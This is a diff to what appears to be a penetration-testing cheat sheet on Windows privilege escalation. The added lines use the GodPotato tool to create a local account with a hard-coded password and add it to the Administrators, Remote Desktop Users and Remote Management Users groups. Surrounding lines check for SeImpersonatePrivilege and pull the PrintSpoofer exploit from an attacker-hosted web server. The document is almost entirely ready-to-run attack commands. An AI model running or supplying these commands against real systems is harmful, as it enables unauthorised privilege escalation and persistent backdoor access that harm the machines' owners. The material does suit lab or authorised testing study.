@@ -112,6 +112,14 @@ whoami /priv | select-string "SeImpersonatePrivilege(.*)Enabled"
 iwr -uri http://$LOCAL_IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 ```
 
+adding user with godpotato.exe
+```powershell
+.\GodPotato.exe -cmd "net user test Password123! /add"
+.\GodPotato.exe -cmd "net localgroup administrators test /add"
+.\GodPotato.exe -cmd 'net localgroup \"Remote Desktop Users\" test /add'
+.\GodPotato.exe -cmd 'net localgroup \"Remote Management Users\" test /add'
+```
+
 ```bash
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 python3 -m http.server 80
